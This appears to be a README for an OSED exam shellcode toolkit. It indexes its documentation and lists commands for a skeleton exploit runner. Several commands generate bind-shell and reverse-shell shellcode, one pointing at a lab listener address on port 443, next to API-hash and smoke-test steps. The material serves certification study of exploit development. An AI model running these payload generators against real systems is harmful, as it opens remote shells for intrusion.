# Windows x86 Shellcode Toolkit

This folder contains imported documentation for the Windows x86 shellcode package and skeleton runner.

## Documents

- [shellcode_package.md](./shellcode_package.md): package architecture, modules, and usage details
- [skeleton_analysis.md](./skeleton_analysis.md): skeleton runner behavior and mode analysis
- [osed_exam_day_checklist.md](./osed_exam_day_checklist.md): concise pre-flight checklist for exam-day operations

## Runner Location

- Script: `/OSED-Toolkit/Exploits/windows_x86/skeleton.py`
- Package: `/OSED-Toolkit/Tools/shellcode_x86_win`

## Common Commands

From repository root:

```bash
python Exploits/windows_x86/skeleton.py --list-snippets
python Exploits/windows_x86/skeleton.py --hash-only LoadLibraryA
python Exploits/windows_x86/skeleton.py --show-asm --mode bindshell --port 4444
python Exploits/windows_x86/skeleton.py --show-asm --mode revshell --lhost 192.168.45.174 --lport 443
```

## Exam Quickstart

Run this sequence from repository root:

1. `make win32-test-smoke`
2. `make win32-list-snippets`
3. `make win32-hash FUNC=LoadLibraryA`
4. `make win32-show-asm-bind PORT=4444`
5. `make win32-show-asm-rev LHOST=192.168.45.174 LPORT=443`

Only move to execution-capable commands after the smoke and `--show-asm` checks pass.
